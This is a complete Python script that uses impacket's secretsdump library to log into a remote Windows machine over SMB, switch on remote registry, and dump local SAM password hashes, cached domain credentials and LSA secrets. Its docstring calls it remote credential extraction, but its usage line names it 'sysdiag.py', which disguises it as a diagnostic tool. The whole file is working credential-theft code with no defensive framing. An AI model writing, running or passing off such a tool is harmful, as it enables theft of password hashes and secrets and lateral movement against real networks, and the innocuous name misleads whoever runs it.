#!/usr/bin/env python3
"""Remote credential extraction using impacket core libraries"""
import sys
from impacket.smbconnection import SMBConnection
from impacket.examples.secretsdump import RemoteOperations, SAMHashes, LSASecrets, NTDSHashes

def main():
    if len(sys.argv) < 2:
        print("Usage: sysdiag.py DOMAIN/user:password@target")
        sys.exit(1)
    
    target_str = sys.argv[1]
    
    # Parse credentials
    domain_user, target = target_str.rsplit('@', 1)
    if '/' in domain_user:
        domain, user_pass = domain_user.split('/', 1)
    else:
        domain = ''
        user_pass = domain_user
    
    if ':' in user_pass:
        username, password = user_pass.split(':', 1)
    else:
        username = user_pass
        password = ''
    
    print(f"[*] Target: {target}")
    print(f"[*] Domain: {domain}")
    print(f"[*] User: {username}")
    
    try:
        # Connect
        smb = SMBConnection(target, target)
        smb.login(username, password, domain)
        print(f"[+] Connected via SMBv{smb.getDialect()}")
        
        # Remote operations
        remote = RemoteOperations(smb, False)
        remote.enableRegistry()
        print("[+] Remote registry enabled")
        
        # SAM hashes
        print("\n[*] Dumping SAM hashes...")
        bootkey = remote.getBootKey()
        sam = SAMHashes(None, bootkey, isRemote=True, perSecretCallback=lambda s: print(f"  {s}"))
        sam.dump()
        
        # LSA secrets
        print("\n[*] Dumping LSA Secrets...")
        try:
            lsa = LSASecrets(None, bootkey, remote, isRemote=True, perSecretCallback=lambda s: print(f"  {s}"))
            lsa.dumpCachedHashes()
            lsa.dumpSecrets()
        except Exception as e:
            print(f"  LSA error: {e}")
        
        # Cleanup
        remote.finish()
        print("\n[+] Done")
        
    except Exception as e:
        print(f"[-] Error: {e}")

if __name__ == '__main__':
    main()
